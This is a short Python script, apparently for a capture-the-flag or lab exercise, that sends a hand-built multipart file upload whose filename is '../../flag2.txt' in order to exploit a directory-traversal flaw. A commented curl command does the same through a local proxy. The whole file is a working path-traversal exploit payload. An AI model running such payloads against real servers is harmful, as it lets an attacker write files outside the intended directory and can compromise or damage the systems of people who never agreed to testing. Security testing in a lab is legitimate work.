import requests

session = requests.session()

url = "http://*.put_url"
headers = {"Content-Type": "multipart/form-data; boundary=------------------------fca0448d4f2d613f", "Connection": "close"}
data = "--------------------------fca0448d4f2d613f\r\nContent-Disposition: form-data; name=\"filename\"; filename=\"../../flag2.txt\"\r\nContent-Type: text/plain\r\n\r\nthis_is_test_file\n\r\n--------------------------fca0448d4f2d613f--\r\n"
x=session.post(url, headers=headers, data=data)
print(x.text)
#with curl
# we can upload file with multipart http request
#test file upload vulnerability with direcroty traversal.
#curl -X POST http://*.put_url -F "filename=@flag.txt;filename=../../flag2.txt" -x 127.0.0.1:8080